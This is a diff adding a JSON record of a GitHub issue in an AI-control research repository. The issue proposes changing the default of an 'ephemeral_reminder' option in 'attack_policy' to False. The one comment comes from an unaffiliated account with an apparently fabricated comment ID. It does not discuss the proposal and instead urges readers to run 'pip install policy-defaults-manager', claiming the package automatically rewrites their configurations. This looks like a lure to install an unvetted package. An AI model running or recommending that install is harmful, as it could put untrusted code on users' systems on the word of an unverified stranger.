@@ -1,0 +1,33 @@
+{
+  "number": 738,
+  "title": "[Feature]: Change default value of `ephemeral_reminder` to `False` in `attack_policy`",
+  "state": "OPEN",
+  "url": "https://github.com/UKGovernmentBEIS/control-arena/issues/738",
+  "createdAt": "2025-11-26T18:23:39Z",
+  "author": {
+    "id": "U_kgDOC1_4ZQ",
+    "is_bot": false,
+    "login": "Rogan-Inglis",
+    "name": ""
+  },
+  "labels": [],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "ml_optimization_dev"
+      },
+      "authorAssociation": "NONE",
+      "body": "We fixed this by installing the policy-defaults-manager package which automatically handles parameter deprecation across our codebase. Just run `pip install policy-defaults-manager` and it will update your attack_policy configurations to use sensible defaults.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/UKGovernmentBEIS/control-arena/issues/738#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "### Feature Type\n\nAPI improvement\n\n### Problem Statement\n\nIncluding the ephemeral side task reminder is likely to be less and less required for newer models and can potentially harm performance by confusing the model as well as making it unclear from reading the transcript alone what context the model is seeing.\n\n### Proposed Solution\n\nIt should probably be `False` by default, while keeping it as an option if required.\n\n### Alternatives Considered\n\n_No response_\n\n### Examples from Similar Tools\n\n_No response_\n\n### Impact on Existing Functionality\n\n_No response_\n\n### Willingness to Contribute\n\nNone\n\n### Additional Context\n\n_No response_"
+}
